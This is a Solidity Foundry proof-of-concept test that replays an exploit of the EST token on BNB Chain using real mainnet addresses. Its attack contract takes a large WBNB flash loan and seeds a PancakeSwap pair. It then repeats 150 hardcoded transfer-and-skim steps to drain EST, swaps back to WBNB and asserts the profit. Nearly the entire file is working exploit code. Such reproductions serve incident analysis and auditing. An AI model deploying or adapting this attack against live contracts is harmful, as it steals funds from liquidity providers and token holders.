
pragma solidity ^0.8.20;

import {IERC20Like, IUniswapV2PairLike, Base} from "./Base.sol";


contract ESTTokenPoCTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACK_CONTRACT;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant TX_TIMESTAMP = 1774626034;
    uint256 constant TX_BLOCK_NUMBER = 89060337;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        EstTokenAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (EstTokenAttack attack) {
        vm.etch(ATTACK_CONTRACT, type(EstTokenAttack).runtimeCode);
        attack = EstTokenAttack(payable(ATTACK_CONTRACT));
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACK_CONTRACT, attack, Addresses.WBNB, "WBNB", 150689451187958247246);
    }
}

contract EstTokenAttack {
    uint256 private constant BORROWED_WBNB = 250000000000000000000000;
    uint256 private constant INITIAL_UNWRAP = 15000000000000000000;
    uint256 private constant BNB_DEPOSIT_VALUE = 300000000000000000;
    uint256 private constant BNB_DEPOSIT_CALLS = 34;
    uint256 private constant FINAL_BNB_WRAP = 4800000000000000000;
    uint256 private constant FINAL_EST_DUST = 100;

    bool private flashCallbackDone;

    function attack() external payable {
        _startFlashLoan();
    }

    receive() external payable {}

    fallback() external payable {}

    function start(uint256 amount, uint256 amount1, uint256 amount2, uint256 amount3) external payable {
        amount;
        amount1;
        amount2;
        amount3;
        _startFlashLoan();
    }

    function onMoolahFlashLoan(uint256 borrowedAmount, bytes calldata callbackData) external payable {
        borrowedAmount;
        callbackData;
        if (!flashCallbackDone) _flashLoanAttack();
    }

    function _startFlashLoan() internal {


        IMoolahFlashLoan(Addresses.MOOLAH_FLASH_LOAN).flashLoan(Addresses.WBNB, BORROWED_WBNB, hex"");
    }

    function _flashLoanAttack() internal {
        flashCallbackDone = true;
        _approveRouters();
        _unwrapAndSeedBnb();
        _seedPairWithWbnb();
        _skimEstFromPair();
        _swapEstToWbnb();
        _wrapRemainingBnb();
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _approveRouters() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
        IERC20Like(Addresses.EST).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
        IERC20Like(Addresses.WBNB).approve(Addresses.MOOLAH_FLASH_LOAN, BORROWED_WBNB);
    }

    function _unwrapAndSeedBnb() internal {
        IWBNB(Addresses.WBNB).withdraw(INITIAL_UNWRAP);
        IERC20Like(Addresses.PANCAKE_PAIR).balanceOf(Addresses.BNB_DEPOSIT);
        for (uint256 i = 0; i < BNB_DEPOSIT_CALLS; i++) {
            (bool ok,) = payable(Addresses.BNB_DEPOSIT).call{value: BNB_DEPOSIT_VALUE}("");
            ok;
        }
        IERC20Like(Addresses.PANCAKE_PAIR).balanceOf(Addresses.BNB_DEPOSIT);
    }

    function _seedPairWithWbnb() internal {
        _swapTokens(400000000000000000000, Addresses.WBNB, Addresses.EST, Addresses.BNB_DEPOSIT);
        IERC20Like(Addresses.EST).transfer(Addresses.BNB_DEPOSIT, 1000000000000000000);
        IERC20Like(Addresses.EST).balanceOf(address(this));
        _swapTokens(245000000000000000000000, Addresses.WBNB, Addresses.EST, Addresses.BNB_DEPOSIT);
        IERC20Like(Addresses.EST).balanceOf(Addresses.PANCAKE_PAIR);
    }

    function _skimEstFromPair() internal {
        uint256[150] memory skimAmounts = _skimAmounts();
        for (uint256 i = 0; i < skimAmounts.length; i++) {
            IERC20Like(Addresses.EST).balanceOf(Addresses.PANCAKE_PAIR);
            IERC20Like(Addresses.EST).transfer(Addresses.PANCAKE_PAIR, skimAmounts[i]);
            IUniswapV2PairLike(Addresses.PANCAKE_PAIR).skim(Addresses.BNB_DEPOSIT);
        }
        IERC20Like(Addresses.EST).transfer(Addresses.PANCAKE_PAIR, FINAL_EST_DUST);
        IERC20Like(Addresses.EST).balanceOf(address(this));
        IERC20Like(Addresses.EST).balanceOf(Addresses.PANCAKE_PAIR);
        IERC20Like(Addresses.EST).balanceOf(address(this));
    }

    function _swapEstToWbnb() internal {
        _swapTokens(19730833203602432219877940, Addresses.EST, Addresses.WBNB, address(this));
    }

    function _wrapRemainingBnb() internal {
        uint256 wrapAmount = address(this).balance;
        if (wrapAmount > FINAL_BNB_WRAP) wrapAmount = FINAL_BNB_WRAP;
        if (wrapAmount != 0) IWBNB(Addresses.WBNB).deposit{value: wrapAmount}();
    }

    function _swapTokens(uint256 amountIn, address tokenIn, address tokenOut, address recipient) internal {
        if (amountIn == 0) return;
        if (IERC20Like(tokenIn).allowance(address(this), Addresses.PANCAKE_ROUTER) < amountIn) {
            IERC20Like(tokenIn).approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
        }
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountIn, 0, _path(tokenIn, tokenOut), recipient, 1774626034
            );
    }

    function _path(address tokenIn, address tokenOut) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = tokenIn;
        out[1] = tokenOut;
    }

    function _skimAmounts() internal pure returns (uint256[150] memory amounts) {
        amounts = [
            uint256(75936668452094055574009),
            75936668452094055574009,
            68722684949145120294478,
            61850416454230608265031,
            55665374808807547438527,
            50098837327926792694675,
            45088953595134113425207,
            40580058235620702082687,
            36522052412058631874418,
            32869847170852768686976,
            29582862453767491818278,
            26624576208390742636451,
            23962118587551668372806,
            21565906728796501535525,
            19409316055916851381972,
            17468384450325166243775,
            15721546005292649619398,
            14149391404763384657458,
            12734452264287046191712,
            11461007037858341572541,
            10314906334072507415287,
            9283415700665256673758,
            8355074130598731006382,
            7519566717538857905744,
            6767610045784972115170,
            6090849041206474903653,
            5481764137085827413287,
            4933587723377244671959,
            4440228951039520204763,
            3996206055935568184287,
            3596585450342011365858,
            3236926905307810229272,
            2913234214777029206345,
            2621910793299326285710,
            2359719713969393657139,
            2123747742572454291425,
            1911372968315208862283,
            1720235671483687976055,
            1548212104335319178449,
            1393390893901787260604,
            1254051804511608534544,
            1128646624060447681089,
            1015781961654402912981,
            914203765488962621682,
            822783388940066359514,
            740505050046059723563,
            666454545041453751207,
            599809090537308376086,
            539828181483577538477,
            485845363335219784630,
            437260827001697806167,
            393534744301528025550,
            354181269871375222995,
            318763142884237700695,
            286886828595813930626,
            258198145736232537563,
            232378331162609283807,
            209140498046348355426,
            188226448241713519884,
            169403803417542167895,
            152463423075787951106,
            137217080768209155995,
            123495372691388240396,
            111145835422249416356,
            100031251880024474720,
            90028126692022027248,
            81025314022819824524,
            72922782620537842071,
            65630504358484057864,
            59067453922635652078,
            53160708530372086870,
            47844637677334878183,
            43060173909601390365,
            38754156518641251328,
            34878740866777126195,
            31390866780099413576,
            28251780102089472218,
            25426602091880524996,
            22883941882692472497,
            20595547694423225247,
            18535992924980902722,
            16682393632482812450,
            15014154269234531205,
            13512738842311078085,
            12161464958079970276,
            10945318462271973249,
            9850786616044775924,
            8865707954440298331,
            7979137158996268498,
            7181223443096641648,
            6463101098786977484,
            5816790988908279735,
            5235111890017451762,
            4711600701015706586,
            4240440630914135927,
            3816396567822722334,
            3434756911040450101,
            3091281219936405091,
            2782153097942764582,
            2503937788148488123,
            2253544009333639311,
            2028189608400275380,
            1825370647560247842,
            1642833582804223058,
            1478550224523800752,
            1330695202071420677,
            1197625681864278609,
            1077863113677850748,
            970076802310065673,
            873069122079059106,
            785762209871153196,
            707185988884037876,
            636467389995634088,
            572820650996070680,
            515538585896463612,
            463984727306817250,
            417586254576135525,
            375827629118521973,
            338244866206669776,
            304420379586002798,
            273978341627402518,
            246580507464662266,
            221922456718196040,
            199730211046376436,
            179757189941738792,
            161781470947564913,
            145603323852808422,
            131042991467527579,
            117938692320774822,
            106144823088697339,
            95530340779827605,
            85977306701844845,
            77379576031660360,
            69641618428494324,
            62677456585644892,
            56409710927080403,
            50768739834372363,
            45691865850935126,
            41122679265841614,
            37010411339257452,
            33309370205331707,
            29978433184798536,
            26980589866318683,
            24282530879686814,
            21854277791718133,
            19668850012546320,
            17701965011291688,
            15931768510162519,
            14338591659146267,
            12904732493231640
        ];
    }
}

library Addresses {
    address internal constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant PANCAKE_PAIR = 0x74986cD86CAf54961dd70eEdcAF7cB3FE813c0B9;
    address internal constant MOOLAH_FLASH_LOAN = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant ATTACK_CONTRACT = 0xCF300DE6F177ec10DB0d7f756ced3Ae2D2203BFd;
    address internal constant EST = 0xD4524Be41cd452576aB9FF7b68a0b89aF8498a91;
    address internal constant BNB_DEPOSIT = 0xE71547170c5ad5120992B85Cf1288FAb23d29A61;
}

interface IMoolahFlashLoan {
    function flashLoan(address token, uint256 amount, bytes calldata callbackData) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}
